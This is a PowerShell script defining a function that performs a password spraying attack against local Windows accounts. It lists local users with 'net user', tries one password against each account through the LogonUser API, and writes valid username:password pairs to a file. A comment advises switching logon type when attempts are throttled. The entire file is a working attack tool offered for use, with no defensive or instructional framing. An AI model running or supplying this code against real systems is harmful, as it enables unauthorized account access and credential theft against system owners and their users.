function Invoke-LocalPasswordSpray {
    Param(
        [Parameter(Position = 1, Mandatory = $false)]
        [string]$UserList = "C:\temp\UserList.txt",
        [Parameter(Position = 2, Mandatory = $false)]
        [string]$Password
    )

    # P/Invoke LogonUser directly - faster than PrincipalContext on Win11/2025
    $signature = @'
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool LogonUser(
    string lpszUsername,
    string lpszDomain,
    string lpszPassword,
    int dwLogonType,
    int dwLogonProvider,
    out IntPtr phToken);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);
'@

    $AdvApi32 = Add-Type -MemberDefinition $signature -Name 'AdvApi32' -Namespace 'PInvoke' -PassThru

    # LOGON32_LOGON_INTERACTIVE = 2, LOGON32_PROVIDER_DEFAULT = 0
    # Try LOGON32_LOGON_NETWORK = 3 if interactive is throttled
    $logonType = 3
    $logonProvider = 0

    $UserListExists = Test-Path $UserList
    if (-not $UserListExists) {
        Write-Host "##### Making a list of all local users #####"
        New-Item -ItemType Directory -Path "C:\temp" -Force | Out-Null
        $rawUsers = net user
        $stripped = ($rawUsers | Select-Object -Skip 4 | Where-Object { $_ -notmatch 'The command completed successfully\.' })
        $stripped.Trim() -replace '\s+', "`r`n" | Out-File -Encoding ascii C:\temp\UserList.txt
    }

    Write-Host "[*] Using $UserList as userlist"
    $Users = Get-Content $UserList
    $count = $Users.Count
    $curr_user = 0
    $time = Get-Date
    Write-Host -ForegroundColor Yellow "[*] Password spraying started at $($time.ToShortTimeString())"

    foreach ($User in $Users) {
        $token = [IntPtr]::Zero
        # Use "." for local machine context
        $result = $AdvApi32::LogonUser($User, ".", $Password, $logonType, $logonProvider, [ref]$token)

        if ($result) {
            $null = $AdvApi32::CloseHandle($token)
            Add-Content C:\temp\sprayed-creds.txt "$User`:$Password"
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
        }

        $curr_user++
        Write-Host -NoNewline "$curr_user of $count users tested`r"
    }

    Write-Host -ForegroundColor Yellow "`n[*] Password spraying complete"
    Write-Host -ForegroundColor Yellow "[*] Results saved to C:\temp\sprayed-creds.txt"
}
